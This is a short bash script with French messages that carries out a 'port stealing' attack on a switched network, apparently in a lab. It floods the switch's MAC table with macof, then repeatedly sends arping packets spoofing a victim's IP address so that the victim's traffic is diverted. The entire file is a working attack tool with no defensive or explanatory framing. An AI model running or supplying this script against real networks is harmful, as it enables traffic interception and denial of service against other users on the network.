#!/bin/bash

echo "=== Port Stealing Attack ==="
echo "Objectif: Voler le port d'une victime"

VICTIM_IP="192.168.189.200"
ATTACKER_MAC=$(ip link show ens224 | grep link | awk '{print $2}')
INTERFACE="ens224"

echo "1. CAM Flooding pour remplir la table CAM..."
macof -i $INTERFACE &

sleep 2

echo "2. Envoi de paquets avec MAC de la victime..."
while true; do
    arping -c 1 -s $VICTIM_IP -w 1 $VICTIM_IP 2>/dev/null
    sleep 0.1
done &

echo "Attaque en cours..."
echo "Appuyer sur Entree pour arreter..."
read

killall macof arping 2>/dev/null
echo "Port Stealing arrete."
